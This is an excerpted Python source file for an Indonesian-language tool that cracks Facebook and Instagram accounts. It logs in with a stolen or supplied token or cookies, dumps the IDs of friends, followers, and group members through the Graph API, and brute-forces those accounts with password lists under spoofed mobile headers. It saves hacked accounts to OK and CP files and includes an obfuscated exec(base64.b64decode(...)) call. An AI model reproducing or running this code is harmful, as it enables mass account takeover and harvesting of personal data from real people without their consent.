#################################################################
#         		ATHOUR : JESSICA PUTRY			#
#  		       WHATSAPP : 6287799183568			#
#	FACEBOOK : https://m.facebook.com/100008778428051	#
#################################################################
## import list
import os,sys
try: import requests
...
def menu():
	...
	if os.path.exists('licensed.log'):
		try:
			toket = open('licensed.log', 'r').read()
			git = requests.get('https://github.com/bucin25/License/blob/main/id').text.strip()
			if toket in git:
				##kasih def logo###
				os.system('clear')
				print('license tersedia')
				os.system('clear')
			else:
				os.system('clear')
				###kasih def logo###
				print('license tidak tersedia')
		except IOError:
			os.system('rm -rf licensed.log')
	else:
		print('')
...
#		exit(jalan(war+"Hapus Useragent Berhasil, Dan Anda Menggunakan Useragent Default"))
	...
	print("")
	print("")
	jalan (" \33[3;1m\033[1;97mMENU Pilihan......\33[0;1m\033")
	print("")
	jalan(C+" ["+P+"01"+C+"]"+P+" Crack ID Publik Unlimited")
	jalan(C+" ["+P+"02"+C+"]"+P+" Crack ID Follower Unlimited")
	jalan(C+" ["+P+"03"+C+"]"+P+" Crack ID Teman/Public/Follower")
	jalan(C+" ["+P+"04"+C+"]"+P+" Crack ID Teman Old ")
	jalan(C+" ["+P+"05"+C+"]"+P+" Crack ID Random Old ")
	jalan(C+" ["+P+"06"+C+"]"+P+" Crack ID Anggota Groups ")
	jalan(C+" ["+P+"07"+C+"]"+H+" Crack INSTAGRAM ")
	jalan(C+" ["+P+"08"+C+"]"+P+" Ganti User Agent")
	jalan(C+" ["+P+"09"+C+"]"+P+" Check Opsi Akun Facebook ")
	jalan(C+" ["+P+"10"+C+"]"+P+" Check ID")
	jalan(C+" ["+P+"11"+C+"]"+P+" Lihat Hasil Crack")
	jalan(C+" ["+P+"12"+C+"]"+P+" Chat \x1b[1;92mAdmin \x1b[1;97mJika Ada Masalah ")
	jalan(C+" ["+P+"00"+C+"]"+M+" Hapus Token/Cookies")
...
def buat_laporan():
	...
	url_wa = "https://api.whatsapp.com/send?phone=6287799183568&text="
	tks = ("Halo Admin Jmbf :)\nInfo : \nNama Pengirim : "+anu+"\n\nPesan (Laporan) : "+anun)
...
def tanya_opsi():
	global opsii
	anjag = input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;97mTampilkan Option Login Facebook (\033[1;96mY\033[1;97m/\033[1;91mn\033[1;97m) : \033[1;93m")
...
def gabung_pw():
	...
	jalan(war+'Masukan Password Contoh : sayang,kontol,anjing')
...
#    ua = _dapunta_dapunta_('ugent.txt','r').read()
    global ua
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": uas,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
...
#    ua = _dapunta_dapunta_('ugent.txt','r').read()
    global ua
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
...
exec(base64.b64decode(user_agnet_random[10]))
...
class crackmenu:
    ...
    def pro_ses(self):
        jalan("")
        jalan("\33[3;1m\033[1;97mSedang Dalam Proses......\33[0;1m\033")
        print("\033[1;97mMainkan Data Mode Pesawat 1 Detik Disaat Crack Berjalan Di Angka 100 dan Di Angka 2000\n"+war+"\033[1;97mCP Tersimpan Di : "+K+"Hasil/CP-"+durasi+".txt\n"+Q+war+"\033[1;97mOK Tersimpan Di : "+I+"Hasil/OK-"+durasi+".txt\n"+Q)
	
    def menu_crack(self):   # METHOD AUTO PASSWROD        
        jalan("\n \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mPilih Methode Login :")
        print("\n \033[1;96m[\033[1;97m1\033[1;96m] \033[1;97mB-Api V1      ( Fast Crack  ) ( Rawan Spam )");time.sleep(0.02)
        print(" \033[1;96m[\033[1;97m2\033[1;96m] \033[1;97mB-Api V2      ( Fast Crack  ) ");time.sleep(0.02)
        print(" \033[1;96m[\033[1;97m3\033[1;96m] \033[1;97mB-Api V3      ( Fast Crack  )");time.sleep(0.02)
        print(" \033[1;96m[\033[1;97m4\033[1;96m] \033[1;97mMbasic V1     ( Slow Crack  )");time.sleep(0.02)
        print(" \033[1;96m[\033[1;97m5\033[1;96m] \033[1;97mMbasic V2 "+C+"Pro"+Q+" ( Slow Crack  )");time.sleep(0.02)
        print(" \033[1;96m[\033[1;97m6\033[1;96m] \033[1;97mMbasic V3 "+C+"Pro"+Q+" ( Fast Crack  )");time.sleep(0.02)
        print(" \033[1;96m[\033[1;97m7\033[1;96m] \033[1;97mMobile V1 "+C+"Pro"+Q+" ( Fast Crack  ) ( "+I+"Disarankan"+Q+" )\n");time.sleep(0.02)
    def menu_crack_m(self):   # METHOD MANUAL PASSWORD
        jalan("\n \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mPilih Methode Login :")
        print(" \033[1;96m[\033[1;97m1\033[1;96m] \033[1;97mB-Api V1      ( Fast Crack  ) ( Rawan Spam )");time.sleep(0.02)
        print(" \033[1;96m[\033[1;97m2\033[1;96m] \033[1;97mB-Api V2      ( Fast Crack  ) ");time.sleep(0.02)
        print(" \033[1;96m[\033[1;97m3\033[1;96m] \033[1;97mMbasic V1     ( Slow Crack  )");time.sleep(0.02)
        print(" \033[1;96m[\033[1;97m4\033[1;96m] \033[1;97mMbasic V2     ( Fast Crack  )");time.sleep(0.02)
        print(" \033[1;96m[\033[1;97m5\033[1;96m] \033[1;97mMobile V1 "+C+"Pro"+Q+" ( Fast Crack  ) ( "+I+"Disarankan"+Q+" )\n");time.sleep(0.02)
    ...
    def passmenu(self,isifile):
        try:
            ...
            menu()
        cjj = open(".paww", "w")
        zk = input('\n \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mPilih Password (\033[1;96mD\033[1;97m/\033[1;93mm\033[1;97m/\033[1;92mg\033[1;97m) :\033[1;93m ')
...
#                       pilih_infong()
                       ...
                       jalan(war+"Isi Dengan Benar");time.sleep(1)
...
#                buat_angka()
                ...
                jm = input(' \033[1;96m[\033[1;97m?\033[1;96m] PILIH : \033[1;93m')
                if jm == "":
                   jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1)
                   crackmenu().passmenu()
                elif jm == "1" or jm == "01":
...
def login():
	...
	print
	print ("")
	jalan(" Silahkan Pilih Metode Login....")
	print (" \033[1;97m")
	print (" \033[1;96m[\033[1;97m1\033[1;96m]\033[1;97m Login menggunakan Token")
	print (" \033[1;96m[\033[1;97m2\033[1;96m]\033[1;97m Login menggunakan Cookies")
	print (" \033[1;96m[\033[1;97m3\033[1;96m]\033[1;97m Cara mengambil Token/Cookies")
	print (" \033[1;97m")
	h_ = input(' \033[1;96m[\033[1;97m?\033[1;96m] PILIH : \033[1;93m')
	if h_ in ["1", "01", "token"]:
		token()
	elif h_ in ["2", "02", "cokies"]:
		coke()
	elif h_ in ["3", "03", "cokies"]:
		os.system("xdg-open https://www.youtube.com/watch?v=6XJdBTc7rf0&t=110s")
	else:jalan(war+"Isi Dengan Benar");time.sleep(1);login()
def auto_token():
	ba = 0
	bi = 0
...
def token():
    toket = input(" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m Masukan Token Facedbook :\033[1;93m ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
...
def coke():
        _cookie=input(' \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m Masukan Cookies Facedbook : \033[1;93m'+I)
...
def dump_old():
        try:
                ...
                login()
        try:
                nada = int(input("\n \033[1;96m[\033[1;97m?\033[1;96m] \033[1;97mJumlah Target ID :\033[1;93m "))
                if nada>20:
                ...
                time.sleep(0.5)
                dump_old()
        namax = input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;97mNama File :\033[1;93m ")
        if namax == "" or namax == " ":
           namax = text_random()
#           jalan(war+"Nama File Tidak Boleh Kosong");time.sleep(1);dump_old
        ...
        for dot in range(nada):
                ...
                tampung = []
                non_old = []
                uid = input(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mMasukan ID Target Ke %s : "%(dot))
                try:
...
#                        print(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mTotal ID : %s"%(len(non_old)))
                        print(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mJumlah Akun Old : %s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        jalan(war+"Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
        ...
        if id_ == "0" or "0" == id_:
             ...
             print(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mTotal ID : %s"%(len(id)))
             jalan(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mNama Hasil Dump : "+I+"dump/"+namax+".json"+Q)
             zz = input(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mCrack Dengan File Ini (\033[1;96mY\033[1;97m/\033[1;91mn\033[1;97m) :\033[1;93m ")
             if zz in ["Y", "y", "Yes", "1"]:
...
def dump_follow_ulti():
	...
	jalan(war+"Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
	idt = input(war+"Masukan Idz Atau Username Target %s : "%(Q))
	idt = ubah_username_to_id(idt)
	try:
		if idt == "me" or "me" == idt:
			otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
		...
		exit(jalan(war+"Maaf ID "+C+idt+Q+" Ini Tidak DiTemukan !"))
	jalan("\n"+war+"Nama   : "+I+nama+Q+"\n")
	for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=2&access_token="+token).json()["paging"]["next"]:
		nextt += (i)
	for nenen in nextt:
		print(nenen)
...
def dump_follow():
	...
	try:
		tanya_total = int(input("\n \033[1;96m[\033[1;97m?\033[1;96m] \033[1;97mJumlah Target ID :\033[1;93m "))
	except:tanya_total=1
	namafi = input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;97mNama File :\033[1;93m ")
	if namafi == "" or namafi == " ":
		namafi = text_random()
	dump = open('dump/'+namafi+'.json','w') 
	jalan(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mKetik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
	for t in range(tanya_total):
		t +=1
		idt = input(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mMasukan ID %s :\033[1;93m "%(t))
		idt = ubah_username_to_id(idt)
		limit = ("10000")
		try:
			if idt == "me" or "me" == idt:
			...
			jalan(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mMaaf ID Tidak Ditemukan ")
			continue
		jalan(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mNama   : "+I+nama+Q+"\n")
		try:
			dump = open('dump/'+namafi+'.json','a+') 
			for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token).json()["data"]:
				try:
	...
	id_ = ("%s"%(len(id)))
	if id_ == "0" or "0" == id_:
		jalan(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mKemungkinan ID Yang Anda Masukan Tidak Dipublikasikan ")
	else:
		print(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mTotal ID : %s"%(len(id)))
		jalan(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mNama Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
		zz = input(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mCrack Dengan File Ini (\033[1;96mY\033[1;97m/\033[1;91mn\033[1;97m) :\033[1;93m ")
		if zz in ["Y", "y", "Yes", "1"]:
			...
			pass
	input(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mTekan ENTER ")
	menu()
def cek_history(it):
	global tanya_total
	vc = ""
...
#				tinggal = ("Nama Kota Tidak DiTemukan")
			...
			jalan(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97m Maaf ID "+C+idt+Q+" Ini Tidak DiTemukan ! ("+str(e)+")")
			continue
		jalan(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mNama   : "+I+nama+Q+"\n")
...
#				tinggal = ("Nama Kota Tidak DiTemukan")
			...
			continue
		jalan(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mNama   : "+I+nama+Q+"\n")
#		jalan(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mTempat   : "+I+tempat+Q)
#		jalan(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97m : "+I+tinggal+Q+"\n")
		try:
			dump = open('dump/'+namafi+'.json','a+')
			for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token).json()["data"]:
				try:
	...
	id_ = ("%s"%(len(id)))
	if id_ == "0" or "0" == id_:
		jalan(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mKemungkinan ID Yang Anda Masukan TIDAK PUBLIK !!")
	else:
		print(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mTotal ID : %s"%(len(id)))
		jalan(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mNama Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
		zz = input(" \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mCrack Dengan File Ini (\033[1;96mY\033[1;97m/\033[1;91mn\033[1;97m) :\033[1;93m ")
